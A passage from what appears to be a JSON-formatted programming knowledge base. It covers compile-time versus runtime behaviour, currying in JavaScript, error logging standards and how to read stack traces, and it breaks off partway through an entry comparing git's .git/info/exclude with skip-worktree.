runtime (use-after-free)\n```\n\n**Runtime Performance Assumptions**\n```javascript\n// Looks identical, very different runtime performance\nconst obj1 = { x: 1, y: 2 };        // Fast property access\nconst obj2 = {};\nobj2.x = 1;                          // Potentially slower due to dynamic property addition\nobj2.y = 2;\n```\n\n**Type System Misunderstanding**\n```typescript\n// TypeScript compile time vs JavaScript runtime\nfunction process(data: string) {\n    return data.toUpperCase();\n}\n\n// Compiles fine in TypeScript, but if called from JavaScript:\nprocess(null);  // Runtime error: Cannot read property 'toUpperCase' of null\n```\n\n## Practical Applications\n\n### Web Development\n- **Compile time**: TypeScript type checking, Webpack bundling, Sass compilation\n- **Runtime**: DOM manipulation, API calls, user interactions\n\n### Mobile Development\n- **Compile time**: Swift/Kotlin compilation, resource bundling, dead code elimination\n- **Runtime**: Memory management, network requests, sensor data processing\n\n### Systems Programming\n- **Compile time**: C++ template instantiation, static linking, optimization passes\n- **Runtime**: Dynamic loading, memory allocation, system calls\n\n## References\n\n1. **\"Compilers: Principles, Techniques, and Tools\" (Dragon Book)** by Aho, Sethi, and Ullman - Comprehensive coverage of compilation phases and optimization techniques.\n\n2. **\"Programming Language Pragmatics\"** by Michael Scott - Excellent explanation of language design decisions affecting compile-time vs runtime behavior.\n\n3. **\"Systems Performance: Enterprise and the Cloud\"** by Brendan Gregg - Deep dive into runtime performance analysis and optimization strategies.\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n#### Template Metaprogramming\n```cpp\ntemplate<int N>\nstruct Factorial {\n    static const int value = N * Factorial<N-1>::value;  // Computed at compile time\n};\n\ntemplate<>\nstruct Factorial<0> {\n    static const int value = 1;\n};\n\nint main() {\n    const int result = Factorial<10>::value;  // 3628800 calculated during compilation\n    return 0;\n}\n```\n\nThis demonstrates compile-time computation where complex calculations happen during compilation, not execution.\n\n#### Dynamic Code Generation\n```python\n# Runtime code generation and execution\ndef create_function(operation):\n    code = f\"\"\"\ndef dynamic_func(x, y):\n    return x {operation} y\n\"\"\"\n    exec(code, globals())\n    return dynamic_func\n\nmultiply = create_function('*')\nresult = multiply(5, 3)  # Function created and called at runtime\n```\n\n#### JIT Compilation Hybrid\n```csharp\n// C# - Compiled to IL at compile time, JIT compiled to machine code at runtime\npublic class Performance {\n    public int Calculate(int[] data) {\n        int sum = 0;\n        for(int i = 0; i < data.Length; i++) {  // Loop may be optimized by JIT\n            sum += data[i] * 2;\n        }\n        return sum;\n    }\n}\n```\n\n#### Reflection and Runtime Type Information\n```java\n// Runtime type inspection and method invocation\npublic void processObject(Object obj) {\n    Class<?> clazz = obj.getClass();           // Runtime type discovery\n    Method[] methods = clazz.getMethods();     // Runtime method enumeration\n    \n    for(Method method : methods) {\n        if(method.getName().startsWith(\"get\")) {\n            Object result = method.invoke(obj);  // Runtime method invocation\n        }\n    }\n}\n```\n\n#### Link-Time Optimization (LTO)\n```cpp\n// file1.cpp\nint expensive_calculation(int x) {\n    return x * x + 2 * x + 1;\n}\n\n// file2.cpp  \nextern int expensive_calculation(int);\nint main() {\n    return expensive_calculation(5);  // May be inlined across files with LTO\n}\n```\n\nWith LTO, the compiler can inline `expensive_calculation` even though it's in a separate compilation unit, blurring the line between compile-time and link-time optimization.\n\n#### Profile-Guided Optimization\nModern compilers can use runtime profiling data to make better compile-time decisions:\n\n```cpp\n// Hot path identified through profiling\nif (likely_condition) {  // Compiler optimizes for this branch\n    fast_path();\n} else {\n    slow_path();         // Less optimized\n}\n```\n\nThe compiler uses runtime behavior data to optimize the most frequently executed code paths."
    },
    {
      "id": "swe/misc/curry-functions",
      "title": "Currying Functions: Complete Overview",
      "path": [
        "swe",
        "misc",
        "curry-functions"
      ],
      "content": "# Currying Functions: Complete Overview\n\nCurrying is a functional programming technique that transforms a function with multiple arguments into a sequence of functions, each taking a single argument. Instead of calling `add(2, 3)`, a curried version would be `add(2)(3)`. Think of currying like a vending machine that requires multiple coins inserted one at a time, rather than all at once—each coin (argument) unlocks the next slot until you get your product (result).\n\n## Key Points\n\n- **Definition:** Transforms `f(a, b, c)` into `f(a)(b)(c)`\n- **Partial Application:** Create specialized functions by providing arguments incrementally\n- **Reusability:** Build new functions from existing ones without rewriting logic\n- **Composition:** Makes functions easier to compose and chain\n- **Arity:** Each curried function takes exactly one argument\n\n## What is Currying?\n\nCurrying converts a function that takes multiple arguments into a series of unary (single-argument) functions.\n\n```javascript\n// Regular function\nfunction add(a, b, c) {\n  return a + b + c;\n}\n\nadd(2, 3, 4); // 9\n\n// Curried function\nfunction addCurried(a) {\n  return function(b) {\n    return function(c) {\n      return a + b + c;\n    };\n  };\n}\n\naddCurried(2)(3)(4); // 9\n\n// Arrow function syntax (cleaner)\nconst addCurried = a => b => c => a + b + c;\naddCurried(2)(3)(4); // 9\n```\n\n## Why Use Currying?\n\n### 1. Partial Application\n\nCreate specialized functions by pre-filling arguments:\n\n```javascript\n// Curried multiply function\nconst multiply = x => y => x * y;\n\n// Create specialized functions\nconst double = multiply(2);\nconst triple = multiply(3);\nconst quadruple = multiply(4);\n\nconsole.log(double(5));     // 10\nconsole.log(triple(5));     // 15\nconsole.log(quadruple(5));  // 20\n\n// Without currying, you'd need:\nfunction createMultiplier(x) {\n  return function(y) {\n    return x * y;\n  };\n}\n```\n\n### 2. Function Composition\n\nCurried functions compose naturally:\n\n```javascript\n// Curried functions\nconst add = x => y => x + y;\nconst multiply = x => y => x * y;\nconst subtract = x => y => y - x;\n\n// Compose operations\nconst addThenDouble = x => multiply(2)(add(5)(x));\nconsole.log(addThenDouble(10)); // (10 + 5) * 2 = 30\n\n// More readable with composition helper\nconst compose = (...fns) => x => fns.reduceRight((v, f) => f(v), x);\n\nconst addFive = add(5);\nconst doubleIt = multiply(2);\n\nconst addThenDouble2 = compose(doubleIt, addFive);\nconsole.log(addThenDouble2(10)); // 30\n```\n\n### 3. Code Reusability\n\n```javascript\n// Generic logger\nconst log = level => message => timestamp => \n  console.log(`[${timestamp}] ${level}: ${message}`);\n\n// Create specialized loggers\nconst info = log('INFO');\nconst error = log('ERROR');\nconst debug = log('DEBUG');\n\n// Use specialized loggers\ninfo('Server started')(new Date().toISOString());\n// [2024-12-19T10:30:00.000Z] INFO: Server started\n\nerror('Connection failed')(new Date().toISOString());\n// [2024-12-19T10:30:00.000Z] ERROR: Connection failed\n\n// Even more specialized\nconst errorNow = error('Database connection failed');\nerrorNow(new Date().toISOString());\n```\n\n## Practical Examples\n\n### Example 1: API Request Builder\n\n```javascript\n// Curried fetch wrapper\nconst apiRequest = method => url => headers => body => \n  fetch(url, {\n    method,\n    headers,\n    body: body ? JSON.stringify(body) : undefined\n  }).then(res => res.json());\n\n// Create specialized request functions\nconst get = apiRequest('GET');\nconst post = apiRequest('POST');\nconst put = apiRequest('PUT');\nconst del = apiRequest('DELETE');\n\n// Create API-specific functions\nconst apiGet = get('https://api.example.com');\nconst apiPost = post('https://api.example.com');\n\n// Add default headers\nconst authGet = apiGet({ 'Authorization': 'Bearer token123' });\nconst authPost = apiPost({ \n  'Authorization': 'Bearer token123',\n  'Content-Type': 'application/json'\n});\n\n// Use specialized functions\nauthGet(null);  // GET request with auth\nauthPost({ name: 'John' });  // POST request with auth and body\n\n// Real usage\nconst getUsers = authGet;\nconst createUser = authPost;\n\ngetUsers(null);\ncreateUser({ name: 'Alice', email: 'alice@example.com' });\n```\n\n### Example 2: Event Handlers\n\n```javascript\n// Curried event handler\nconst handleEvent = eventType => callback => element => \n  element.addEventListener(eventType, callback);\n\n// Specialized handlers\nconst onClick = handleEvent('click');\nconst onInput = handleEvent('input');\nconst onSubmit = handleEvent('submit');\n\n// Create specific callbacks\nconst logClick = onClick(() => console.log('Clicked!'));\nconst validateInput = onInput(e => console.log('Value:', e.target.value));\n\n// Apply to elements\nconst button = document.getElementById('myButton');\nconst input = document.getElementById('myInput');\n\nlogClick(button);\nvalidateInput(input);\n\n// One-liner usage\nonClick(() => alert('Hello'))(document.getElementById('btn'));\n```\n\n### Example 3: Discount Calculator\n\n```javascript\n// Curried discount function\nconst applyDiscount = discountPercent => price => \n  price * (1 - discountPercent / 100);\n\n// Create discount tiers\nconst tenPercentOff = applyDiscount(10);\nconst twentyPercentOff = applyDiscount(20);\nconst fiftyPercentOff = applyDiscount(50);\n\n// Apply discounts\nconsole.log(tenPercentOff(100));     // 90\nconsole.log(twentyPercentOff(100));  // 80\nconsole.log(fiftyPercentOff(100));   // 50\n\n// Use in pricing system\nconst prices = [100, 200, 300];\nconst discountedPrices = prices.map(twentyPercentOff);\nconsole.log(discountedPrices); // [80, 160, 240]\n```\n\n### Example 4: Data Validation\n\n```javascript\n// Curried validators\nconst isGreaterThan = min => value => value > min;\nconst isLessThan = max => value => value < max;\nconst isLength = length => str => str.length === length;\nconst matches = regex => str => regex.test(str);\n\n// Create specific validators\nconst isAdult = isGreaterThan(17);\nconst isValidAge = isLessThan(120);\nconst isZipCode = isLength(5);\nconst isEmail = matches(/^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/);\n\n// Use validators\nconsole.log(isAdult(25));           // true\nconsole.log(isValidAge(150));       // false\nconsole.log(isZipCode('12345'));    // true\nconsole.log(isEmail('test@example.com')); // true\n\n// Combine validators\nconst validateAge = age => isAdult(age) && isValidAge(age);\nconsole.log(validateAge(25));  // true\nconsole.log(validateAge(15));  // false\n```\n\n### Example 5: Array Transformations\n\n```javascript\n// Curried map, filter, reduce\nconst map = fn => arr => arr.map(fn);\nconst filter = fn => arr => arr.filter(fn);\nconst reduce = fn => initial => arr => arr.reduce(fn, initial);\n\n// Create transformations\nconst doubleAll = map(x => x * 2);\nconst evensOnly = filter(x => x % 2 === 0);\nconst sum = reduce((acc, x) => acc + x)(0);\n\nconst numbers = [1, 2, 3, 4, 5];\n\nconsole.log(doubleAll(numbers));  // [2, 4, 6, 8, 10]\nconsole.log(evensOnly(numbers));  // [2, 4]\nconsole.log(sum(numbers));        // 15\n\n// Compose transformations\nconst sumOfDoubledEvens = arr => \n  sum(doubleAll(evensOnly(arr)));\n\nconsole.log(sumOfDoubledEvens(numbers)); // (2 + 4) * 2 = 12\n```\n\n## Auto-Currying Utility\n\n```javascript\n// Utility to curry any function\nfunction curry(fn) {\n  return function curried(...args) {\n    if (args.length >= fn.length) {\n      return fn.apply(this, args);\n    } else {\n      return function(...args2) {\n        return curried.apply(this, args.concat(args2));\n      };\n    }\n  };\n}\n\n// Use with any function\nfunction add(a, b, c) {\n  return a + b + c;\n}\n\nconst curriedAdd = curry(add);\n\nconsole.log(curriedAdd(1)(2)(3));        // 6\nconsole.log(curriedAdd(1, 2)(3));        // 6\nconsole.log(curriedAdd(1)(2, 3));        // 6\nconsole.log(curriedAdd(1, 2, 3));        // 6\n\n// Real-world example\nfunction buildUrl(protocol, domain, path) {\n  return `${protocol}://${domain}${path}`;\n}\n\nconst curriedBuildUrl = curry(buildUrl);\n\nconst https = curriedBuildUrl('https');\nconst httpsExample = https('example.com');\n\nconsole.log(httpsExample('/api/users'));     // https://example.com/api/users\nconsole.log(httpsExample('/api/products'));  // https://example.com/api/products\n```\n\n## Currying vs Partial Application\n\n```javascript\n// Currying: Always one argument at a time\nconst curriedAdd = a => b => c => a + b + c;\ncurriedAdd(1)(2)(3); // 6\n\n// Partial Application: Can take multiple arguments\nfunction add(a, b, c) {\n  return a + b + c;\n}\n\nconst partialAdd = (a, b) => c => add(a, b, c);\npartialAdd(1, 2)(3); // 6\n\n// Currying is a special case of partial application\n// where each function takes exactly one argument\n```\n\n## Common Pitfalls\n\n- Over-currying simple functions (adds unnecessary complexity)\n- Confusing currying with partial application\n- Loss of performance (function call overhead)\n- Debugging difficulties (deep call stacks)\n- Not compatible with variadic functions (variable arguments)\n\n## When to Use Currying\n\n```javascript\n// ✅ Good: Configuration functions\nconst createLogger = level => prefix => message => \n  console.log(`[${prefix}] ${level}: ${message}`);\n\nconst appLogger = createLogger('INFO')('MyApp');\nappLogger('Server started');\n\n// ✅ Good: Reusable transformations\nconst multiply = x => y => x * y;\nconst double = multiply(2);\n[1, 2, 3].map(double); // [2, 4, 6]\n\n// ✅ Good: Function composition\nconst add5 = add(5);\nconst double = multiply(2);\nconst add5ThenDouble = compose(double, add5);\n\n// ❌ Bad: Unnecessary for simple operations\nconst add = a => b => a + b;  // Overkill for simple addition\n// Just use: (a, b) => a + b\n```\n\n## Libraries with Currying\n\n```javascript\n// Ramda (functional programming library)\nimport * as R from 'ramda';\n\nconst add = R.add;\nconst addFive = add(5);\nconsole.log(addFive(10)); // 15\n\n// All Ramda functions are curried\nconst users = [\n  { name: 'Alice', age: 25 },\n  { name: 'Bob', age: 30 }\n];\n\nconst getName = R.prop('name');\nconst names = R.map(getName)(users);\nconsole.log(names); // ['Alice', 'Bob']\n\n// Lodash (with fp module)\nimport fp from 'lodash/fp';\n\nconst map = fp.map;\nconst filter = fp.filter;\nconst flow = fp.flow;\n\nconst isEven = x => x % 2 === 0;\nconst double = x => x * 2;\n\nconst processNumbers = flow(\n  filter(isEven),\n  map(double)\n);\n\nconsole.log(processNumbers([1, 2, 3, 4])); // [4, 8]\n```\n\n## References\n\n- [Haskell Curry (Mathematician)](https://en.wikipedia.org/wiki/Haskell_Curry)\n- [Functional Programming in JavaScript](https://eloquentjavascript.net/)\n- [Ramda Documentation](https://ramdajs.com/)\n- [Lodash FP Guide](https://github.com/lodash/lodash/wiki/FP-Guide)\n\n---\n\n## Quick Summary\n\n**Currying transforms:**\n```javascript\nf(a, b, c) → f(a)(b)(c)\n```\n\n**Benefits:**\n- Partial application → specialized functions\n- Better composition → chainable operations\n- Reusability → DRY code\n\n**Use when:**\n- Creating function families (loggers, validators)\n- Building pipelines (data transformations)\n- Functional programming patterns\n\n**Avoid when:**\n- Simple, one-off operations\n- Performance critical code\n- Team unfamiliar with FP concepts"
    },
    {
      "id": "swe/misc/error-handling/error-logging-standards",
      "title": "Error Logging Standards: A Concise Overview",
      "path": [
        "swe",
        "misc",
        "error-handling",
        "error-logging-standards"
      ],
      "content": "# Error Logging Standards: A Concise Overview\n\nError logging standards define best practices for capturing, formatting, and managing error information in software systems. Adhering to these standards improves debugging, monitoring, and system reliability.\n\n## Key Points\n\n- **Consistency:** Use a uniform format for error messages and logs.\n- **Context:** Include relevant metadata (timestamp, severity, environment, user/session info).\n- **Levels:** Distinguish between error levels (error, warning, info, debug).\n- **Traceability:** Log stack traces and error codes for easier troubleshooting.\n- **Security:** Avoid logging sensitive data (e.g., passwords, personal info).\n\n## Step-by-Step Explanation & Examples\n\n1. **Structured Logging Example (JSON)**\n   ```json\n   {\n     \"timestamp\": \"2025-09-16T12:34:56Z\",\n     \"level\": \"error\",\n     \"message\": \"Database connection failed\",\n     \"errorCode\": \"DB_CONN_ERR\",\n     \"stack\": \"Error: ...\",\n     \"userId\": \"12345\"\n   }\n   ```\n\n2. **Logging in Code (Node.js Example)**\n   ```js\n   logger.error('Database connection failed', {\n     errorCode: 'DB_CONN_ERR',\n     stack: err.stack,\n     userId: req.user.id\n   });\n   ```\n\n3. **Error Levels**\n   - `error`: Critical failures\n   - `warn`: Recoverable issues\n   - `info`: General events\n   - `debug`: Detailed diagnostic info\n\n## Common Pitfalls\n\n- Logging too little or too much information.\n- Failing to log errors at the correct level.\n- Not rotating or archiving logs, leading to disk space issues.\n- Logging sensitive or personally identifiable information.\n\n## Practical Applications\n\n- Monitoring and alerting in production systems.\n- Auditing and compliance.\n- Debugging and root cause analysis.\n\n## References\n\n- [OWASP: Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)\n- [12 Factor App: Logs](https://12factor.net/logs)\n- [Google Cloud: Error Reporting Best Practices](https://cloud.google.com/error-reporting/docs/best-practices)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Centralized Logging:** Use tools like ELK Stack, Splunk, or cloud logging services for aggregation and analysis.\n- **Correlation IDs:** Track requests across distributed systems for end-to-end tracing.\n- **Log Sampling & Rate Limiting:** Prevent log flooding in high-traffic environments.\n- **Automated Alerting:** Integrate with monitoring systems to trigger"
    },
    {
      "id": "swe/misc/error-handling/error-logs-itermediate",
      "title": "Reading Error Logs: Complete Overview",
      "path": [
        "swe",
        "misc",
        "error-handling",
        "error-logs-itermediate"
      ],
      "content": "# Reading Error Logs: Complete Overview\n\nError logs are diagnostic messages generated when something goes wrong in your application, providing crucial information about what failed, where, and why. Learning to read them efficiently is essential for debugging—knowing whether to start from the top or bottom of a stack trace can save significant time. Think of error logs as breadcrumbs leading you back through your code's execution path to find where things went wrong.\n\n## Key Points\n\n- **Stack Traces:** Show the call sequence leading to an error (read bottom-up for root cause)\n- **Error Messages:** Top of the log usually contains the actual error description\n- **Context:** Logs include file names, line numbers, and function names\n- **Reading Strategy:** Start at top for \"what\" happened, bottom for \"where\" it originated\n- **Log Levels:** ERROR, WARN, INFO, DEBUG indicate severity\n\n## Step-by-Step Explanation & Examples\n\n1. **Basic Error Log Structure**\n\n   ```\n   Error: Cannot read property 'name' of undefined\n       at getUserName (app.js:45:12)\n       at processUser (app.js:32:18)\n       at main (app.js:10:5)\n       at Object.<anonymous> (app.js:3:1)\n   ```\n   \n   **Reading order:**\n   - **Top:** Error message tells you WHAT failed\n   - **Bottom:** First line in stack shows WHERE it originated (main at line 3)\n   - **Middle:** Shows the call chain (main → processUser → getUserName)\n\n2. **JavaScript/Node.js Error (Read Bottom-Up for Root Cause)**\n\n   ```\n   TypeError: Cannot read properties of null (reading 'toString')\n       at formatPrice (utils.js:23:15)        ← Actual error location\n       at renderProduct (components.js:67:21) ← Called formatPrice\n       at ProductList (components.js:102:9)   ← Called renderProduct\n       at App (index.js:15:3)                 ← Entry point\n   ```\n   \n   **Strategy:** Start at line 1 for the error type, then go to the BOTTOM of YOUR code (skip node_modules) to find where in your application the chain started.\n\n3. **Backend API Error with HTTP Context**\n\n   ```\n   [ERROR] 2025-11-18T10:23:45.123Z\n   POST /api/users/123/orders - 500 Internal Server Error\n   \n   Error: Failed to create order\n       at OrderService.create (order.service.ts:89:11)\n       at OrderController.createOrder (order.controller.ts:34:28)\n       at /node_modules/express/lib/router/route.js:144:13\n   \n   Caused by: Connection timeout\n       at Database.query (database.ts:156:9)\n       at OrderRepository.save (order.repository.ts:45:20)\n   ```\n   \n   **Strategy:** \n   - Top: HTTP method, endpoint, status code (context)\n   - Middle: Main error and your application code\n   - Bottom: Root cause (\"Caused by\") shows the underlying issue\n\n4. **Frontend React Error (Development Mode)**\n\n   ```\n   Uncaught Error: Invalid product ID\n       at Product (Product.jsx:12:15)\n       at renderWithHooks (react-dom.development.js:14985:18)\n       at mountIndeterminateComponent (react-dom.development.js:17811:13)\n       at beginWork (react-dom.development.js:19049:16)\n   \n   The above error occurred in the <Product> component:\n       at Product (http://localhost:3000/static/js/bundle.js:123:5)\n       at ProductList\n       at App\n   ```\n   \n   **Strategy:**\n   - First section: Technical stack trace (read bottom-up)\n   - \"The above error occurred in\": Component tree (read top-down)\n   - Focus on YOUR components, ignore React internals\n\n5. **Python Stack Trace (Read Bottom-Up)**\n\n   ```\n   Traceback (most recent call last):\n     File \"main.py\", line 5, in <module>\n       process_data()\n     File \"main.py\", line 10, in process_data\n       result = calculate(data)\n     File \"utils.py\", line 23, in calculate\n       return value / count\n   ZeroDivisionError: division by zero\n   ```\n   \n   **Strategy:** \n   - Bottom: Actual error (ZeroDivisionError)\n   - Read upward to see the call chain\n   - Top shows the entry point\n\n6. **Nested Errors / Error Chains**\n\n   ```\n   Error: Failed to load user profile\n       at ProfileService.load (profile.service.ts:45:11)\n       at UserController.getProfile (user.controller.ts:28:23)\n   \n   Caused by: Network request failed\n       at HttpClient.get (http.client.ts:67:15)\n   \n   Caused by: ECONNREFUSED 127.0.0.1:5432\n       at TCPConnectWrap.afterConnect [as oncomplete] (net.js:1144:16)\n   ```\n   \n   **Strategy:**\n   - Read each \"Caused by\" section from bottom to top\n   - The deepest \"Caused by\" is the root cause (ECONNREFUSED)\n   - Higher levels show how the error propagated\n\n## Common Pitfalls\n\n- Ignoring the actual error message at the top (tells you WHAT failed)\n- Reading only the first line of the stack without checking the root cause\n- Getting lost in library/framework code (focus on YOUR application code)\n- Not recognizing the difference between WHERE error occurred vs WHERE it was caught\n- Missing \"Caused by\" or inner exception details\n- Not checking log timestamps (errors might be old or in wrong order)\n- Confusing line numbers when source maps aren't working\n\n## Practical Applications\n\n- Debugging production issues (follow stack to reproduce locally)\n- Identifying performance bottlenecks (repeated errors in logs)\n- Understanding third-party library failures (reading through node_modules)\n- Tracing request flow in microservices (correlation IDs across services)\n- Finding null/undefined reference bugs (most common JavaScript errors)\n\n## References\n\n- [MDN: Error](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error)\n- [Node.js: Error Handling](https://nodejs.org/api/errors.html)\n- [Chrome DevTools: Debugging JavaScript](https://developer.chrome.com/docs/devtools/javascript/)\n- [Python: Traceback Documentation](https://docs.python.org/3/library/traceback.html)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **When to Read Top vs Bottom:**\n  ```\n  TOP-DOWN (start at top):\n  - Error message and type: What failed?\n  - HTTP context: Which endpoint/request?\n  - Timestamps: When did it happen?\n  - Log level: How severe?\n  \n  BOTTOM-UP (start at bottom):\n  - Root cause: Where did it originate?\n  - Call chain: How did we get here?\n  - Your code vs library code: Filter noise\n  - Entry point: Where to start debugging?\n  ```\n\n- **Filtering Library Code:**\n  ```\n  Error: Invalid token\n      at JwtService.verify (jwt.service.ts:34:11)     ← YOUR CODE (start here)\n      at AuthMiddleware.validate (auth.middleware.ts:23:19) ← YOUR CODE\n      at Layer.handle (express/lib/router/layer.js:95:5)    ← SKIP\n      at next (express/lib/router/route.js:137:13)          ← SKIP\n      at Route.dispatch (express/lib/router/route.js:112:3) ← SKIP\n  ```\n  \n  **Strategy:** Scan for file paths you recognize, ignore `node_modules`, framework internals.\n\n- **Source Maps (Minified Code):**\n  ```\n  // Without source maps (production)\n  Error: undefined is not an object\n      at r (bundle.min.js:1:4523)\n      at t (bundle.min.js:1:8932)\n  \n  // With source maps\n  Error: Cannot read property 'id' of undefined\n      at getUserId (src/utils/user.ts:45:12)\n      at handleLogin (src/auth/login.ts:23:18)\n  ```\n  \n  **Enable source maps:** Use `.map` files in production for readable stack traces.\n\n- **Correlation IDs (Distributed Systems):**\n  ```\n  [correlation_id: abc-123] [service: api-gateway] \n  POST /checkout - 500 Internal Server Error\n  \n  [correlation_id: abc-123] [service: payment-service]\n  Error: Payment gateway timeout\n  \n  [correlation_id: abc-123] [service: stripe-api]\n  Error: Connection refused\n  ```\n  \n  **Strategy:** Track single request across multiple services using correlation ID.\n\n- **Async Stack Traces:**\n  ```javascript\n  // Modern Node.js (async stack traces enabled)\n  Error: Database connection failed\n      at Database.connect (database.ts:45:11)\n      at async OrderService.create (order.service.ts:23:5)\n      at async OrderController.post (order.controller.ts:67:9)\n      at async processRequest (express-async-handler.js:12:3)\n  \n  // Notice \"at async\" showing async boundaries\n  ```\n\n- **Error Context and Metadata:**\n  ```typescript\n  // Good error logging with context\n  logger.error('Failed to create order', {\n    error: err.message,\n    stack: err.stack,\n    userId: user.id,\n    orderId: orderId,\n    timestamp: new Date(),\n    environment: process.env.NODE_ENV,\n    requestId: req.id\n  });\n  \n  // Output\n  {\n    \"level\": \"error\",\n    \"message\": \"Failed to create order\",\n    \"userId\": 12345,\n    \"orderId\": \"ORD-789\",\n    \"stack\": \"Error: Database timeout\\n    at ...\",\n    \"timestamp\": \"2025-11-18T10:23:45.123Z\"\n  }\n  ```\n\n- **Common Error Patterns:**\n  ```typescript\n  // Null/undefined reference (JavaScript)\n  TypeError: Cannot read property 'X' of undefined/null\n  → Check if object exists before accessing properties\n  \n  // Network errors\n  ECONNREFUSED, ETIMEDOUT, ENOTFOUND\n  → Service down, wrong URL, or network issue\n  \n  // Database errors\n  ER_DUP_ENTRY, ECONNREFUSED (port 5432/3306)\n  → Duplicate key, database not running\n  \n  // Authentication\n  401 Unauthorized, 403 Forbidden\n  → Missing/invalid token, insufficient permissions\n  \n  // Syntax errors\n  SyntaxError: Unexpected token\n  → Malformed JSON, missing bracket, typo in code\n  ```\n\n- **Debugging Workflow:**\n  ```\n  1. Read error message (top) → Understand WHAT failed\n  2. Check timestamp and context → WHEN and WHERE (endpoint/component)\n  3. Find first line of YOUR code (bottom-up) → Entry point\n  4. Trace upward to error location → Exact line that failed\n  5. Check \"Caused by\" or inner exceptions → Root cause\n  6. Reproduce locally with same input → Fix and test\n  7. Add logging if needed → Prevent future occurrences\n  ```\n\n- **Log Aggregation Tools:**\n  - **Development:** Console, Chrome DevTools, VS Code debugger\n  - **Production:** Sentry, DataDog, LogRocket, CloudWatch, ELK Stack\n  - **Features:** Search, filter by time/user/error type, group similar errors, source map support\n\n- **Best Practices:**\n  - Enable source maps in production (with proper access controls)\n  - Include request IDs for tracing across services\n  - Log structured data (JSON) for easier parsing\n  - Set up alerts for critical errors\n  - Don't log sensitive data (passwords, tokens, PII)\n  - Use appropriate log levels (ERROR for failures, WARN for issues, INFO for events)\n  - Keep stack traces in logs but summarize for users"
    },
    {
      "id": "swe/misc/git/git-exclude-vs-skip-worktree",
      "title": "Git .git/info/exclude vs skip-worktree: Complete Overview",
      "path": [
        "swe",
        "misc",
        "git",
        "git-exclude-vs-skip-worktree"
      ],
      "content": "# Git .git/info/exclude vs skip-worktree: Complete Overview\n\nGit provides multiple ways to ignore files beyond the standard `.gitignore` file. `.git/info/exclude` is a local, repository-specific ignore file that never gets committed, while `skip-worktree` is a flag that tells Git to pretend a tracked file hasn't changed locally. Think of `.git/info/exclude` as a personal \"do not track\" list for files you never want Git to see, and `skip-worktree` as a \"don't tell anyone I changed this\" flag for files that are already tracked but you need to modify locally without committing.\n\n## Key Points\n\n- **.git/info/exclude:** Local gitignore, never committed, for untracked files\n- **skip-worktree:** Flag for tracked files you want to modify locally without committing\n- **Scope:** exclude affects untracked files, skip-worktree affects tracked files\n- **Permanence:** exclude persists in repository, skip-worktree can be reset\n- **Use Cases:** exclude for local tools/configs, skip-worktree for environment-specific overrides\n\n## High-Level Overview\n\n### What is .git/info/exclude?\n\n`.git/info/exclude` is a file in your local repository that works exactly like `.gitignore`, but it's never committed or shared. It lets you ignore files specific to your local workflow without affecting other developers.\n\n**Core concept:** Personal ignore rules that stay on your machine.\n\n```bash\n# Location: .git/info/exclude\n\n# My local IDE files\n.vscode/\n.idea/\n\n# My personal scripts\nmy-local-script.sh\ntest-data/\n\n# My build output location\ndist-local/\n```\n\n### What is skip-worktree?\n\n`skip-worktree` is a Git flag you set on tracked files to tell Git \"ignore local changes to this file.\" The file remains in the repository, but Git pretends it hasn't been modified locally.\n\n**Core concept:** Modify tracked files locally without Git complaining or committing changes.\n\n```bash\n# Mark file to skip worktree\ngit update-index --skip-worktree config/database.yml\n\n# Now you can modify database.yml locally\n# Git won't show it as modified\ngit status  # Clean working directory\n\n# File stays in repository, but local changes ignored\n```\n\n### Why Both Exist\n\n```\n.git/info/exclude:\n✅ For files that should NEVER be tracked\n✅ Personal workflow files\n✅ Local-only tools and configurations\n✅ Alternative to .gitignore when you can't/shouldn't commit it\n\nskip-worktree:\n✅ For files ALREADY tracked that need local modifications\n✅ Environment-specific configurations\n✅ Temporary overrides for development\n✅ Files that need different values per developer\n```\n\n## Similarities\n\n### 1. Both Are Local-Only\n\n```bash\n# Neither affects other developers\n\n# .git/info/exclude\necho \"my-local-folder/\" >> .git/info/exclude\n# Only affects YOUR repository\n\n# skip-worktree\ngit update-index --skip-worktree config.json\n# Only affects YOUR working directory\n\n# Other developers won't see either change\n# These settings don't propagate via push/pull\n```\n\n### 2. Both Prevent Commits (In Different Ways)\n\n```bash\n# .git/info/exclude: Prevents tracking new files\necho \"local-config.json\" >> .git/info/exclude\ntouch local-config.json\ngit status  # Doesn't show local-config.json\n\n# skip-worktree: Prevents committing changes to tracked files\ngit update-index --skip-worktree tracked-config.json\n# Modify tracked-config.json\ngit status  # Doesn't show tracked-config.json as modified\n```\n\n### 3. Both Survive Git Operations\n\n```bash\n# .git/info/exclude persists through:\ngit pull\ngit checkout branch\ngit reset\n\n# skip-worktree persists through:\ngit pull\ngit checkout branch\ngit stash\n# (But can be cleared by git reset --hard)\n```\n\n### 4. Both Are Repository-Specific\n\n```bash\n# Clone same repository twice\ngit clone https://repo.git repo1\ngit clone https://repo.git repo2\n\n# Settings in repo1 don't affect repo2\n# Each repository has independent:\n# - .git/info/exclude file\n# - skip-worktree flags\n```\n\n## Differences\n\n### 1. Target Files\n\n```bash\n# .git/info/exclude: For UNTRACKED files\n# File doesn't exist in repository yet\n\necho \"my-notes.txt\" >> .git/info/exclude\ntouch my-notes.txt\ngit status  # my-notes.txt not shown (ignored)\n\ngit add my-notes.txt  # ❌ Ignored, won't be added\n\n# skip-worktree: For TRACKED files\n# File already exists in repository\n\ngit add config.json\ngit commit -m \"Add config\"\n# Now config.json is tracked\n\ngit update-index --skip-worktree config.json\n# Modify config.json locally\ngit status  # Clean (changes ignored)\n```\n\n### 2. Purpose and Intent\n\n```bash\n# .git/info/exclude: \"Don't track these files\"\n# Use for files that should never enter repository\n\n# Personal IDE settings\n.vscode/\n.idea/\n\n# Local build artifacts\ndist-local/\nbuild-temp/\n\n# Personal scripts\nmy-deploy-script.sh\n\n\n# skip-worktree: \"Track this file, but ignore my local changes\"\n# Use for files in repository that need local modifications\n\n# Database config (tracked, but different per developer)\ngit update-index --skip-worktree config/database.yml\n\n# API keys (tracked template, real keys local-only)\ngit update-index --skip-worktree .env\n\n# Development settings (tracked defaults, custom per dev)\ngit update-index --skip-worktree settings.json\n```\n\n### 3. How to Set/Remove\n\n```bash\n# .git/info/exclude: Edit file 